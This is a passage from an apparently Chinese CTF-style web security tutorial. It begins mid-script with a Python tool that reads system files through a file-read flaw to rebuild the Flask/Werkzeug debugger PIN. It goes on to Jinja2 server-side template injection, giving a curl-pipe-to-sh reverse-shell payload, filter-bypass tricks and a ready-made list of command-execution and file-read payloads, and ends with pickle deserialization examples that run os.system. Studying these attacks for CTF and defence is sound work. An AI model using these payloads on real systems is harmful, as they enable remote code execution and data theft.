&quot;</span>.<span class="built_in">format</span>(pin))</span><br><span class="line">        <span class="keyword">return</span> response.text.strip()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_boot_id</span>():</span><br><span class="line">    payload = <span class="string">&quot;/proc/sys/kernel/random/boot_id&quot;</span></span><br><span class="line">    response = requests.get(url=url+payload)</span><br><span class="line">    <span class="keyword">if</span> response.status_code ==<span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;boot_id is &#123;&#125; &quot;</span>.<span class="built_in">format</span>(response.text.strip()))</span><br><span class="line">        <span class="keyword">return</span> response.text.strip()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cgroup</span>():</span><br><span class="line">    payload = <span class="string">&quot;/proc/self/cgroup&quot;</span></span><br><span class="line">    response = requests.get(url=url+payload)</span><br><span class="line">    <span class="keyword">if</span> response.status_code ==<span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;cgroup is &#123;&#125; &quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(response.text.strip().rpartition(<span class="string">&quot;/&quot;</span>)[<span class="number">2</span>])))</span><br><span class="line">        <span class="keyword">return</span> response.text.strip().rpartition(<span class="string">&quot;/&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_PIN</span>():</span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line">    probably_public_bits = [</span><br><span class="line">        username,<span class="comment"># /etc/passwd</span></span><br><span class="line">        <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">        <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">        path <span class="comment"># 报错得到</span></span><br><span class="line">    ]</span><br><span class="line">        </span><br><span class="line">    private_bits = [get_uuid(), get_mechine_id()+get_boot_id()+get_cgroup()]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;private_bits is &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(private_bits)  </span><br><span class="line"></span><br><span class="line">    <span class="comment">#复制算法逻辑  </span></span><br><span class="line">    h = hashlib.sha1()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">            bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line">    cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line">    <span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">        num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line">    <span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                    num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rv</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        pin = get_PIN()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;PIN is &#123;&#125; &quot;</span>.<span class="built_in">format</span>(pin))</span><br></pre></td></tr></table></figure><h3 id="基于Flask下的SSTI"><a href="#基于Flask下的SSTI" class="headerlink" title="基于Flask下的SSTI"></a>基于Flask下的SSTI</h3><p>ssti全称为模板注入, 也就是当我们可以控制要渲染的模板的时候, 也就是可以控制模板中的变量标记内容, 这时候, 我们可以利用模板语法, 执行python代码, 实现任意代码执行</p><h4 id="python魔术方法和内置类"><a href="#python魔术方法和内置类" class="headerlink" title="python魔术方法和内置类"></a>python魔术方法和内置类</h4><p>在学习ssti注入之前, 我们首先需要了解一些python的魔术方法和内置类</p><h5 id="class"><a href="#class" class="headerlink" title="class"></a><strong>class</strong></h5><p><code>__class</code>__用于返回该对象所属的类</p><p>🌰<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230418224222553.png" alt="image-20230418224222553"></p><h5 id="base"><a href="#base" class="headerlink" title="base"></a><strong>base</strong></h5><p><code>__base__</code>用于获取类的基类(也称父类)</p><p>🌰<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230418224659712.png" alt="image-20230418224659712"></p><h5 id="mro"><a href="#mro" class="headerlink" title="mro"></a><strong>mro</strong></h5><p><code>__mro__</code>返回解析方法调用的顺序, (当调用<code>__mro__[1]</code>或者-1时作用其实等同于<code>__base__</code>)示例:</p><p>🌰</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230418225326640.png" alt="image-20230418225326640"></p><h5 id="subclasses"><a href="#subclasses" class="headerlink" title="subclasses()"></a><strong>subclasses</strong>()</h5><p><code>__subclasses__()</code>可以获取类的所有子类</p><p>🌰<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230418225651272.png" alt="image-20230418225651272"></p><p>目前主要分两种情况下的模板注入</p><h4 id="模板名称可控"><a href="#模板名称可控" class="headerlink" title="模板名称可控"></a>模板名称可控</h4><p>类似于上面学到的内容, 当<code>login.html</code>这个参数可以控制的时候, 我们就能渲染我们指定的文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span>  render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;plz login&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>, username=request.form[<span class="string">&#x27;username&#x27;</span>],passwd=request.form[<span class="string">&#x27;passwd&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">80</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><blockquote><p>render_template 是flask中页面跳转的方法，其用法很简单，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br></pre></td></tr></table></figure><p>这种方法可以传递参数，具体方法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, msg=session.get(<span class="string">&quot;username&quot;</span>))</span><br></pre></td></tr></table></figure><p>这时可以将你想要传递的数据传递到你要跳转的页面，在页面中显示这些内容需要使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;msg&#125;&#125;</span><br></pre></td></tr></table></figure></blockquote><p>这里的<code>login.html</code>可控, 这时候需要一个上传点, 上传包含模板语法的<code>html</code>被渲染就可以渲染执行我们的<code>python</code>代码</p><h4 id="模板内容可控"><a href="#模板内容可控" class="headerlink" title="模板内容可控"></a>模板内容可控</h4><p>如果要实现模板内容可控就需要使用到危险函数, 例如这里使用一个<code>render_template_string()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;plz login&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template_string(request.form[<span class="string">&#x27;content&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">80</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>这里可以成功执行标签内的表达式</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230420143315772.png" alt="image-20230420143315772"></p><p>这里介绍一个最简单的payload<code>name=&#123;&#123;"".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('curl https://your-shell.com/ip:port |sh')&#125;&#125;</code></p><p>这里可以通过反弹shell拿到flag<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230420145830657.png" alt="image-20230420145830657"></p><h5 id="做题思路"><a href="#做题思路" class="headerlink" title="做题思路"></a>做题思路</h5><p>这里大致写一下做题步骤</p><p>在python中, 是通过类名方法名的方式调用的, 如果我们要调用shell命令, 一般我们可以使用<code>os.system(&#39;calc&#39;)</code>, 那么如何在表达式标签中, 找到os类呢</p><p>第一步 拿到当前类</p><p>也就是通过类型拿到<code>__class__</code></p><p>这里我们使用<code>&#123;&#123;"".__class__&#125;&#125;</code></p><p>第二步 拿到当前类的基类</p><p>这时候, 我们可以写为</p><ul><li><code>&#123;&#123;"".__class__.__base__&#125;&#125;</code></li><li><code>&#123;&#123;"".__class__.__base[0]__&#125;&#125;</code></li><li><code>&#123;&#123;"".__class__.__mro__[1]&#125;&#125;</code></li></ul><p>第三步 拿到基类的所有子类</p><p><code>&#123;&#123;"".__class__.__base__.__subclasses__()&#125;&#125;</code></p><p>第四步 寻找我们要利用的os类</p><p>这里我们需要找到os类的下标, 我们可以采用数<code>,</code>的方式, 可以使用文本编辑软件<code>ctrl+f</code></p><p>第五步 找到可利用的类的下标后, 就能知道其方法</p><p>使用<code>__init__</code>方法对类进行初始化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__[<span class="number">0</span>].__subclasses__()[<span class="number">132</span>].__init__&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后再调用<code>__globals__</code>获取到方法内以字典的形式返回的方法/属性等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__[<span class="number">0</span>].__subclasses__()[<span class="number">132</span>].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后就可以通过数组key拿到对应的方法了, 这里我们使用shell执行方法<code>popen</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls /&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230420185744947.png" alt="image-20230420185744947"></p><p>前面所说的相当于命令执行, 下面介绍一种代码执行方法</p><p>使用<code>uiltins</code>类的<code>eval</code>方法构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="flask的ssti的过滤与绕过"><a href="#flask的ssti的过滤与绕过" class="headerlink" title="flask的ssti的过滤与绕过"></a>flask的ssti的过滤与绕过</h4><h5 id="绕过-过滤"><a href="#绕过-过滤" class="headerlink" title="绕过.过滤"></a>绕过<code>.</code>过滤</h5><ul><li><p>使用<code>[]</code>绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__&#125;&#125;=&#123;&#123;<span class="string">&quot;&quot;</span>[<span class="string">&#x27;__class__&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure></li><li><p>attr过滤器绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__&#125;&#125;=&#123;&#123;<span class="string">&quot;&quot;</span>|attr(<span class="string">&#x27;__class__&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure></li></ul><h5 id="绕过-过滤-1"><a href="#绕过-过滤-1" class="headerlink" title="绕过_过滤"></a>绕过<code>_</code>过滤</h5><ul><li><p>构造<code>_</code>出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>).pop(<span class="number">24</span>)%&#125;&#123;%<span class="built_in">print</span>(a)%&#125;</span><br></pre></td></tr></table></figure></li><li><p>16进制编码绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\x5f\x5fcalss\x5f\x5f&quot;</span>]&#125;&#125; = &#123;&#123;().__class__&#125;&#125;</span><br></pre></td></tr></table></figure></li></ul><h5 id="绕过-过滤-2"><a href="#绕过-过滤-2" class="headerlink" title="绕过[]过滤"></a>绕过<code>[]</code>过滤</h5><p>可以使用<code>__getitem__</code>魔术方法, 它的作用简单说就是把中括号转化为括号的形式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__base__[<span class="number">0</span>]=__base__.getitem__(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h5 id="绕过-过滤-3"><a href="#绕过-过滤-3" class="headerlink" title="绕过\{\{过滤"></a>绕过<code>\&#123;\&#123;</code>过滤</h5><p>可以利用jinja2的语法, 用<code>\&#123;%</code>来进行rce</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls /&#x27;</span>).read()&#125;</span><br></pre></td></tr></table></figure><p>还可以利用<code>for</code>循环</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%)&#125;&#123;%<span class="keyword">for</span> i.__name__ == <span class="string">&#x27;_wrp_close&#x27;</span>%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span> i.__init__.globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls /&#x27;</span>).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure><h5 id="绕过单-双引号过滤"><a href="#绕过单-双引号过滤" class="headerlink" title="绕过单/双引号过滤"></a>绕过单/双引号过滤</h5><p>可以采用<code>request.args.a</code>然后给a赋值的方式进行绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[<span class="number">132</span>].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230420194717379.png" alt="image-20230420194717379"></p><p>args被ban了可以用<code>request.cookie</code>伪造</p><h5 id="绕过数字过滤"><a href="#绕过数字过滤" class="headerlink" title="绕过数字过滤"></a>绕过数字过滤</h5><p>如果数字<code>0-9</code>被ban了, 可以通过count来得到数字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(<span class="built_in">dict</span>(e=a)|join|count&#125;&#125;+&#123;&#123;(<span class="built_in">dict</span>(e=a)|join|count&#125;&#125;</span><br></pre></td></tr></table></figure><p>这样就能通过<code>1+1</code>来构造出2</p><p>可以用全角字符绕过例如可以通过<a class="link" target="_blank" rel="noopener" href="http://www.wetools.com/sbc-case-convert">这个网站<i class="fas fa-external-link-alt"></i></a>拿到全角数字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">１２３４５６７８９０</span><br></pre></td></tr></table></figure><h5 id="绕过关键字"><a href="#绕过关键字" class="headerlink" title="绕过关键字"></a>绕过关键字</h5><p><code>class</code>、<code>base</code>这种关键词被过滤的情况, 通常使用join拼接实现</p><p>比如:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="built_in">dict</span>(__<span class="keyword">in</span>=a,it__=a)|join&#125;&#125;= __init__</span><br></pre></td></tr></table></figure><h3 id="SSTI-payload"><a href="#SSTI-payload" class="headerlink" title="SSTI_payload"></a>SSTI_payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、任意命令执行</span><br><span class="line">&#123;%<span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;&#123;%<span class="keyword">if</span> i.__name__ ==<span class="string">&#x27;_wrap_close&#x27;</span>%&#125;&#123;%<span class="built_in">print</span> i.__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;dir&#x27;</span>).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br><span class="line"><span class="number">2</span>、任意命令执行</span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>]. __subclasses__()[<span class="number">138</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><br><span class="line">//这个<span class="number">138</span>对应的类是os._wrap_close，只需要找到这个类的索引就可以利用这个payload</span><br><span class="line"><span class="number">3</span>、任意命令执行</span><br><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"><span class="number">4</span>、任意命令执行</span><br><span class="line">&#123;&#123;x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line">//x的含义是可以为任意字母，不仅仅限于x</span><br><span class="line"><span class="number">5</span>、任意命令执行</span><br><span class="line">&#123;&#123;config.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"><span class="number">6</span>、文件读取</span><br><span class="line">&#123;&#123;x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()&#125;&#125;</span><br><span class="line">//x的含义是可以为任意字母，不仅仅限于x</span><br></pre></td></tr></table></figure><h3 id="python反序列化"><a href="#python反序列化" class="headerlink" title="python反序列化"></a>python反序列化</h3><p>这部分参考了这位<a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11082">大佬的文章<i class="fas fa-external-link-alt"></i></a></p><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>python的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输, 然后使用的时候再将字节流转换回原始的对象的一个过程和php的序列化和反序列化其实差不多, python中反序列化一般有两种方式:<code>pickle</code>和<code>json</code>模块, 前者是python特有的格式, 后者是<code>json</code>通用的格式</p><p>相较于php反序列化的灵活多样的利用, python反序列化主要涉及这么几个概念:<code>pickle</code>,<code>pvm</code>,<code>__reduce__</code>魔术方法, 本文主要来看<code>pickle</code>模块的反序列化漏洞问题</p><p><code>pickle</code>可以用于python特有的类型和python的数据类型之间进行转换(所有python数据类型)</p><p>python提供两个模块实现序列化: <code>cpickle</code>和<code>pickle</code> 这两个模块功能是一样的, 区别在于<code>cpickle</code>是C语言写的, 速度快, <code>pickle</code>是python写的, 速度慢. 在python3中已经没有<code>cpickle</code>模块, <code>pickle</code>有如下四种函数操作方法</p><ul><li><code>pickle.dump(obj,file)</code> : 将对象序列化后保存到文件</li><li><code>pickle.load(file)</code> : 读取文件, 将文件中的序列化内容反序列化为对象</li><li><code>pickle.dumps(obj)</code> : 将对象序列化成字符串格式的字节流</li><li><code>pickle.loads(bytes_obj)</code> : 将字符串格式的字节流反序列化为对象</li></ul><p>魔术方法:</p><ul><li><code>reduce()</code> 反序列化时调用</li><li><code>reduce_ex()</code> 反序列化时调用</li><li><code>setstate()</code> 反序列化时调用</li><li><code>getstate()</code> 反序列化时调用</li></ul><h4 id="简单实用"><a href="#简单实用" class="headerlink" title="简单实用"></a>简单实用</h4><p>例子一</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name=<span class="string">&#x27;charmersix&#x27;</span></span>):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;序列化&#x27;</span>)</span><br><span class="line">a = pickle.dumps(Demo())</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;反序列化&#x27;</span>)</span><br><span class="line">b = pickle.loads(pickle.dumps(Demo())).name</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230421222208937.png" alt="image-20230421222208937"></p><p>例子二</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;反序列化调用&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;calc&#x27;</span>,))</span><br><span class="line"><span class="comment">#反序列化魔术方法调用__reduce__()</span></span><br><span class="line">a = A()</span><br><span class="line"></span><br><span class="line">p_d = pickle.dumps(a)<span class="comment">#序列化</span></span><br><span class="line">pickle.loads(p_d)<span class="comment">#反序列化并调用__reduce__</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p_d)</span><br></pre></td></tr></table></figure><blockquote><p>在第六行中，逗号的作用是将元组中的两个元素分开，以便作为参数传递给__reduce__方法。这个元组的第一个元素是一个可调用的对象（函数或类），而第二个元素是一个参数元组，其中包含传递给该可调用对象的参数。在这种情况下，元组中的第一个元素是os.system函数，第二个元素是字符串’calc’，表示将在反序列化期间执行的命令。</p></blockquote><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230422165516943.png" alt="image-20230422165516943"></p><p>例子3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SerializePerson</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setstate__</span>(<span class="params">self ,name</span>):</span><br><span class="line">        os.system(<span class="string">&#x27;calc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">tmp = pickle.dumps(SerializePerson(<span class="string">&#x27;tom&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line">pickle.loads(tmp)<span class="comment">#反序列化并调用__setstate__</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230422171046289.png" 